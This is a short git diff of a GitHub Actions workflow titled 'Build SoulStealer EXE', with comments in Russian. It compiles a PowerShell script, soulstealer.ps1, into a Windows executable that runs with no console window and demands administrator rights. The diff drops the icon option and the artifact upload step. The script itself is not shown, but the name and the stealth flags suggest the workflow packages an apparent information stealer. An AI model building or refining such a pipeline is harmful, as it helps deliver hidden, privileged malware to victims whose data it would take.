@@ -3,7 +3,7 @@ name: Build SoulStealer EXE
 on:
   push:
     branches: [ main ]
-  workflow_dispatch:  # Чтобы можно было запустить вручную
+  workflow_dispatch:
 
 jobs:
   build:
@@ -22,10 +22,5 @@ jobs:
       - name: Compile ps1 to exe
         shell: powershell
         run: |
-          Invoke-ps2exe .\soulstealer.ps1 .\soulstealer.exe -noConsole -requireAdmin -icon .\icon.ico
-
-      - name: Upload EXE
-        uses: actions/upload-artifact@v4
-        with:
-          name: SoulStealer-EXE
-          path: soulstealer.exe
+          # Без иконки
+          Invoke-ps2exe .\soulstealer.ps1 .\soulstealer.exe -noConsole -requireAdmin
